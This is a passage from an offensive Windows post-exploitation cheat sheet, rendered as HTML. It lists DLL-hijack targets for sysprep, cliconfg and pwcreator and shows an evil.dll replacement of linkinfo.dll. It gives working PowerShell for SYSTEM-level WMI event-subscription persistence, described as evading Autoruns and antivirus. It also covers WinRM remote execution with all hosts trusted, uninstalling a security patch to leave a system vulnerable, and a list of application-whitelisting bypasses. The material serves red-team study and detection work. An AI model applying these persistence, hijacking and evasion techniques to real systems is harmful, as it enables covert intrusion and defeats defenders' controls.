    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">CRYPTSP</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">CRYPTBASE</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">RpcRtRemote</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">UxTheme</span><span class="p">.</span><span class="n">dll</span>

    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">cliconfg</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">NTWDBLIB</span><span class="p">.</span><span class="n">DLL</span>
</pre></div>
</td></tr></table></p>
<p>On Windows 8 there are also three executables that could be exploited and associated DLLs listed below
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">CRYPTBASE</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Sysprep</span><span class="err">\</span><span class="n">dwmapi</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Sysprep</span><span class="err">\</span><span class="n">SHCORE</span><span class="p">.</span><span class="n">dll</span>

    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">cliconfg</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">NTWDBLIB</span><span class="p">.</span><span class="n">DLL</span>

    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">pwcreator</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">vds</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">UReFS</span><span class="p">.</span><span class="n">DLL</span>
</pre></div>
</td></tr></table></p>
<p>Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Sysprep</span><span class="err">\</span><span class="n">SHCORE</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">Sysprep</span><span class="err">\</span><span class="n">OLEACC</span><span class="p">.</span><span class="n">DLL</span>

    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">cliconfg</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">NTWDBLIB</span><span class="p">.</span><span class="n">DLL</span>

    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">pwcreator</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">System32</span><span class="err">\</span><span class="n">vds</span><span class="p">.</span><span class="n">exe</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">Common</span> <span class="n">Files</span><span class="err">\</span><span class="n">microsoft</span> <span class="n">shared</span><span class="err">\</span><span class="n">ink</span><span class="err">\</span><span class="n">CRYPTBASE</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">Common</span> <span class="n">Files</span><span class="err">\</span><span class="n">microsoft</span> <span class="n">shared</span><span class="err">\</span><span class="n">ink</span><span class="err">\</span><span class="n">CRYPTSP</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">Common</span> <span class="n">Files</span><span class="err">\</span><span class="n">microsoft</span> <span class="n">shared</span><span class="err">\</span><span class="n">ink</span><span class="err">\</span><span class="n">dwmapi</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">Common</span> <span class="n">Files</span><span class="err">\</span><span class="n">microsoft</span> <span class="n">shared</span><span class="err">\</span><span class="n">ink</span><span class="err">\</span><span class="n">USERENV</span><span class="p">.</span><span class="n">dll</span>
    <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">Common</span> <span class="n">Files</span><span class="err">\</span><span class="n">microsoft</span> <span class="n">shared</span><span class="err">\</span><span class="n">ink</span><span class="err">\</span><span class="n">OLEACC</span><span class="p">.</span><span class="n">dll</span>
</pre></div>
</td></tr></table></p>
<h5 id="linkinfodll-replacement">linkinfo.dll Replacement<a class="headerlink" href="#linkinfodll-replacement" title="Permanent link">&para;</a></h5>
<p>Windows explorer in older systems loads linkinfo.dll from c:\windows over c:\windows\system32 if it exists
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">copy</span> <span class="n">evil</span><span class="p">.</span><span class="n">dll</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">linkinfo</span><span class="p">.</span><span class="n">dll</span>
</pre></div>
</td></tr></table></p>
<h4 id="wmi-event-persistence-via-powershell">WMI Event Persistence via Powershell<a class="headerlink" href="#wmi-event-persistence-via-powershell" title="Permanent link">&para;</a></h4>
<p>WMI Event persistence explained, you can find a bloated version in powersploit.
Three parts to this: 
* WMI Event Filter
* Event Consumer
* Filter/Consumer Binding
This technique gets you <em>SYSTEM</em> level persistence, requires admin rights to execute.
Autoruns doesn't even check for this yet. (doubt any AVs are either)
Difficult to detect, Difficult to remove if you dont know what youre doing.</p>
<h5 id="wmi-event-filter">WMI Event Filter<a class="headerlink" href="#wmi-event-filter" title="Permanent link">&para;</a></h5>
<p>Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="err">$</span><span class="n">EventFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">[</span><span class="n">WMICLASS</span><span class="o">]</span><span class="ss">&quot;\\.\root\subscription:__EventFilter&quot;</span><span class="p">).</span><span class="n">CreateInstance</span><span class="p">()</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="n">EventFilter</span><span class="p">.</span><span class="n">QueryLanguage</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;WQL&quot;</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="n">EventFilter</span><span class="p">.</span><span class="n">Query</span><span class="w">          </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325&quot;</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="n">EVentFilter</span><span class="p">.</span><span class="n">EventNamespace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;root\cimv2&quot;</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="n">EventFilter</span><span class="p">.</span><span class="n">Name</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;OBVIOUSHACKER&quot;</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="k">Result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">EventFilter</span><span class="p">.</span><span class="n">Put</span><span class="p">()</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="k">Filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="k">Result</span><span class="p">.</span><span class="k">Path</span><span class="w"></span>
</pre></div>
</td></tr></table>

<p><a href="http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx</a></p>
<h5 id="event-consumer">Event Consumer<a class="headerlink" href="#event-consumer" title="Permanent link">&para;</a></h5>
<p>Configure what to execute once the event occurs.
Current example is just a ping.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="err">$</span><span class="n">InstanceConsumer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">[</span><span class="n">wmiclass</span><span class="o">]</span><span class="ss">&quot;\\.\root\subscription:CommandLineEventConsumer&quot;</span><span class="p">).</span><span class="n">CreateInstance</span><span class="p">()</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="n">InstanceConsumer</span><span class="p">.</span><span class="n">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;OBVIOUSHACKER&quot;</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="n">InstanceConsumer</span><span class="p">.</span><span class="n">CommandLineTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;ping 127.0.0.1 -n 100&quot;</span><span class="w">          </span><span class="n">#CMD</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="k">EXECUTE</span><span class="w"> </span><span class="n">HERE</span><span class="w"></span>
<span class="w">    </span><span class="err">$</span><span class="n">InstanceConsumer</span><span class="p">.</span><span class="n">WorkingDirectory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;C:\\windows\\system32&quot;</span><span class="w"></span>
<span class="w">    </span><span class="err">$</span><span class="k">Result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">InstanceConsumer</span><span class="p">.</span><span class="n">Put</span><span class="p">()</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="n">Consumer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="k">Result</span><span class="p">.</span><span class="k">Path</span><span class="w"></span>
</pre></div>
</td></tr></table>

<p><a href="http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx</a>
<a href="http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx</a></p>
<h5 id="filterconsumer-binding">Filter/Consumer Binding<a class="headerlink" href="#filterconsumer-binding" title="Permanent link">&para;</a></h5>
<p>This is the object that correlates the Filter with the Consumer.
Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="err">$</span><span class="n">InstanceBinding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">[</span><span class="n">wmiclass</span><span class="o">]</span><span class="ss">&quot;\\.\root\subscription:__FilterToConsumerBinding&quot;</span><span class="p">).</span><span class="n">CreateInstance</span><span class="p">()</span><span class="w"> </span>
<span class="w">    </span><span class="err">$</span><span class="n">InstanceBinding</span><span class="p">.</span><span class="k">Filter</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="k">Filter</span><span class="w"></span>
<span class="w">    </span><span class="err">$</span><span class="n">InstanceBinding</span><span class="p">.</span><span class="n">Consumer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">Consumer</span><span class="w"></span>
<span class="w">    </span><span class="err">$</span><span class="k">Result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">InstanceBinding</span><span class="p">.</span><span class="n">Put</span><span class="p">()</span><span class="w"> </span>
</pre></div>
</td></tr></table>

<p><a href="http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx</a></p>
<h5 id="removal">REMOVAL<a class="headerlink" href="#removal" title="Permanent link">&para;</a></h5>
<p>The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example)</p>
<p><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="n">__eventFilter</span> <span class="o">-</span><span class="n">namespace</span> <span class="n">root</span><span class="err">\</span><span class="n">subscription</span> <span class="o">-</span><span class="n">filter</span> <span class="ss">&quot;name=&#39;OBVIOUSHACKER&#39;&quot;</span><span class="o">|</span> <span class="n">Remove</span><span class="o">-</span><span class="n">WmiObject</span>
    <span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="n">CommandLineEventConsumer</span> <span class="o">-</span><span class="n">Namespace</span> <span class="n">root</span><span class="err">\</span><span class="n">subscription</span> <span class="o">-</span><span class="n">filter</span> <span class="ss">&quot;name=&#39;OBVIOUSHACKER&#39;&quot;</span> <span class="o">|</span> <span class="n">Remove</span><span class="o">-</span><span class="n">WmiObject</span>
    <span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="n">__FilterToConsumerBinding</span> <span class="o">-</span><span class="n">Namespace</span> <span class="n">root</span><span class="err">\</span><span class="n">subscription</span> <span class="o">|</span> <span class="k">Where</span><span class="o">-</span><span class="k">Object</span> <span class="err">{</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">filter</span> <span class="o">-</span><span class="k">match</span> <span class="s1">&#39;OBVIOUSHACKER&#39;</span><span class="err">}</span> <span class="o">|</span> <span class="n">Remove</span><span class="o">-</span><span class="n">WmiObject</span>
</pre></div>
</td></tr></table>
<a href="http://www.exploit-monday.com/2013/04/PersistenceWithPowerShell.html">Some more detailed information on the subject</a></p>
<p><a href="http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/">http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/</a></p>
<h4 id="malicious-outlook-rules">Malicious Outlook Rules<a class="headerlink" href="#malicious-outlook-rules" title="Permanent link">&para;</a></h4>
<ul>
<li><a href="https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/">https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/</a></li>
<li>Ruler</li>
<li><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></li>
</ul>
<h4 id="windows-remote-management-winrm-psremoting">Windows Remote Management (WinRM) / PSRemoting<a class="headerlink" href="#windows-remote-management-winrm-psremoting" title="Permanent link">&para;</a></h4>
<ul>
<li>Listens on 5985/5986 by default and allows interactive shell access over HTTP/S</li>
<li>Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module)</li>
<li>Metasploit has multiple modules for locating the service and gaining shells over WinRM</li>
</ul>
<p><em>Connect to a remote host with WinRM from local Windows host</em>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Enable</span><span class="o">-</span><span class="n">PSRemoting</span>
    <span class="k">Set</span><span class="o">-</span><span class="n">Item</span> <span class="o">-</span><span class="n">Path</span> <span class="n">WSMan</span><span class="p">:</span><span class="err">\</span><span class="n">localhost</span><span class="err">\</span><span class="n">Client</span><span class="err">\</span><span class="n">TrustedHosts</span> <span class="o">*</span> <span class="o">-</span><span class="k">force</span>
    <span class="k">or</span> 
    <span class="k">Set</span><span class="o">-</span><span class="n">Item</span> <span class="o">-</span><span class="n">Path</span> <span class="n">WSMan</span><span class="p">:</span><span class="err">\</span><span class="n">localhost</span><span class="err">\</span><span class="n">Client</span><span class="err">\</span><span class="n">TrustedHosts</span> <span class="o">-</span><span class="n">value</span> <span class="ss">&quot;&lt;host&gt;&quot;</span> <span class="o">-</span><span class="k">Force</span>
    <span class="err">$</span><span class="n">cred</span> <span class="o">=</span> <span class="k">Get</span><span class="o">-</span><span class="n">Credential</span>
    <span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="k">host</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span> <span class="n">gci</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span> <span class="err">}</span> <span class="o">-</span><span class="n">credential</span> <span class="err">$</span><span class="n">cred</span>
</pre></div>
</td></tr></table></p>
<h4 id="uninstall-a-patch-to-leave-the-system-vulnerable">Uninstall a patch to leave the system vulnerable<a class="headerlink" href="#uninstall-a-patch-to-leave-the-system-vulnerable" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wusa</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">uninstall</span> <span class="o">/</span><span class="n">kb</span><span class="p">:</span><span class="mi">976932</span>
</pre></div>
</td></tr></table>

<h4 id="create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords">Create custom DLL for password filters and install on DC to capture changed passwords<a class="headerlink" href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" title="Permanent link">&para;</a></h4>
<ul>
<li><a href="http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html">http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html</a></li>
</ul>
<h3 id="application-whitelisting-bypass-techniques">Application Whitelisting Bypass Techniques<a class="headerlink" href="#application-whitelisting-bypass-techniques" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt">SubTee Collection of Whitelist Bypass Techniques </a>
<a href="https://bitbucket.org/jsthyer/wevade.git">https://bitbucket.org/jsthyer/wevade.git</a></p>
<p>Version .0.0.3
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="mf">1.</span><span class="w"> </span><span class="n">IEExec</span><span class="w"> </span><span class="o">-</span><span class="n">This</span><span class="w"> </span><span class="n">technique</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="k">work</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">certain</span><span class="w"> </span><span class="n">environments</span><span class="p">.</span><span class="w">  </span><span class="n">Its</span><span class="w"> </span><span class="n">relies</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">fact</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">many</span><span class="w"> </span><span class="n">organizations</span><span class="w"> </span><span class="n">trust</span><span class="w"> </span><span class="n">executables</span><span class="w"> </span><span class="n">signed</span><span class="w"></span>
<span class="k">by</span><span class="w"> </span><span class="n">Microsoft</span><span class="p">.</span><span class="w">  </span><span class="n">We</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">misuse</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">trust</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">launching</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">specially</span><span class="w"> </span><span class="n">crafted</span><span class="w"> </span><span class="p">.</span><span class="n">NET</span><span class="w"> </span><span class="n">application</span><span class="p">.</span><span class="w"> </span>
<span class="n">Example</span><span class="w"> </span><span class="nl">Here</span><span class="p">:</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">room362</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">post</span><span class="o">/</span><span class="mi">2014</span><span class="o">/</span><span class="mi">2014</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="n">application</span><span class="o">-</span><span class="n">whitelist</span><span class="o">-</span><span class="n">bypass</span><span class="o">-</span><span class="k">using</span><span class="o">-</span><span class="n">ieexec</span><span class="o">-</span><span class="n">dot</span><span class="o">-</span><span class="n">exe</span><span class="o">/</span><span class="w"></span>

<span class="mf">2.</span><span class="w">  </span><span class="n">Rundll32</span><span class="p">.</span><span class="n">exe</span><span class="w"></span>

<span class="mf">3.</span><span class="w">  </span><span class="n">ClickOnce</span><span class="w"> </span><span class="n">Applications</span><span class="w"> </span><span class="n">dfsvc</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="n">dfshim</span><span class="p">.</span><span class="n">dll</span><span class="w"></span>

<span class="mf">4.</span><span class="w">  </span><span class="n">XBAP</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nc">XML</span><span class="w"> </span><span class="n">Browser</span><span class="w"> </span><span class="n">Applications</span><span class="w"> </span><span class="n">WPF</span><span class="w"> </span><span class="n">PresentationHost</span><span class="p">.</span><span class="n">exe</span><span class="w"></span>

<span class="mf">5.</span><span class="w">  </span><span class="n">MD5</span><span class="w"> </span><span class="n">Hash</span><span class="w"> </span><span class="n">Collision</span><span class="w"> </span>
<span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">mathstat</span><span class="p">.</span><span class="n">dal</span><span class="p">.</span><span class="n">ca</span><span class="o">/~</span><span class="n">selinger</span><span class="o">/</span><span class="n">md5collision</span><span class="o">/</span><span class="w"></span>

<span class="mf">6.</span><span class="w">  </span><span class="n">PowerShell</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Specifically</span><span class="w"> </span><span class="n">Reflective</span><span class="w"> </span><span class="n">Execution</span><span class="w"></span>
<span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">clymb3r</span><span class="p">.</span><span class="n">wordpress</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2013</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="n">reflective</span><span class="o">-</span><span class="n">dll</span><span class="o">-</span><span class="n">injection</span><span class="o">-</span><span class="k">with</span><span class="o">-</span><span class="n">powershell</span><span class="o">/</span><span class="w"></span>
<span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">defcon</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="n">defcon</span><span class="o">-</span><span class="mi">21</span><span class="o">/</span><span class="n">dc</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="n">presentations</span><span class="o">/</span><span class="n">Bialek</span><span class="o">/</span><span class="n">DEFCON</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="n">Bialek</span><span class="o">-</span><span class="n">PowerPwning</span><span class="o">-</span><span class="n">Post</span><span class="o">-</span><span class="n">Exploiting</span><span class="o">-</span><span class="k">by</span><span class="o">-</span><span class="n">Overpowering</span><span class="o">-</span><span class="n">Powershell</span><span class="p">.</span><span class="n">pdf</span><span class="w"></span>

<span class="mf">7.</span><span class="w"> </span><span class="p">.</span><span class="n">HTA</span><span class="w"> </span><span class="n">Application</span><span class="w"> </span><span class="n">Invoke</span><span class="w"> </span><span class="n">PowerShell</span><span class="w"> </span><span class="n">Scripts</span><span class="w"></span>
<span class="w">    </span><span class="n">Launched</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">mshta</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span><span class="w"> </span><span class="n">bypasses</span><span class="w"> </span><span class="n">IE</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">settings</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">well</span><span class="p">.</span><span class="w"></span>

<span class="mf">8.</span><span class="w">  </span><span class="n">bat</span><span class="p">,</span><span class="w"> </span><span class="n">vbs</span><span class="p">,</span><span class="w"> </span><span class="n">ps1</span><span class="w"></span>
<span class="w">    </span><span class="mf">1.</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">/</span><span class="n">k</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">script</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="w">    </span><span class="mf">2.</span><span class="w"> </span><span class="n">cscript</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">//</span><span class="nl">E</span><span class="p">:</span><span class="n">vbscript</span><span class="w"> </span><span class="n">script</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="w">    </span><span class="mf">3.</span><span class="w"> </span><span class="k">Get</span><span class="o">-</span><span class="n">Content</span><span class="w"> </span><span class="n">script</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">iex</span><span class="w"></span>

<span class="mf">9.</span><span class="w"> </span><span class="n">Malicious</span><span class="w"> </span><span class="n">Troubleshooting</span><span class="w"> </span><span class="n">packs</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">MSDT</span><span class="p">.</span><span class="n">exe</span><span class="w"></span>
<span class="w">    </span><span class="nl">Reference</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">cybersyndicates</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2015</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="n">a</span><span class="o">-</span><span class="k">no</span><span class="o">-</span><span class="n">bull</span><span class="o">-</span><span class="n">guide</span><span class="o">-</span><span class="k">to</span><span class="o">-</span><span class="n">malicious</span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">trouble</span><span class="o">-</span><span class="n">shooting</span><span class="o">-</span><span class="n">packs</span><span class="o">-</span><span class="ow">and</span><span class="o">-</span><span class="n">application</span><span class="o">-</span><span class="n">whitelist</span><span class="o">-</span><span class="n">bypass</span><span class="o">/</span><span class="w"></span>
<span class="w">    </span><span class="n">Thanks</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nv">@nberthaume</span><span class="p">,</span><span class="w"> </span><span class="nv">@Killswitch_GUI</span><span class="w"> </span>

<span class="mf">10.</span><span class="w"> </span><span class="n">InstallUtil</span><span class="p">.</span><span class="n">exe</span><span class="w"></span>
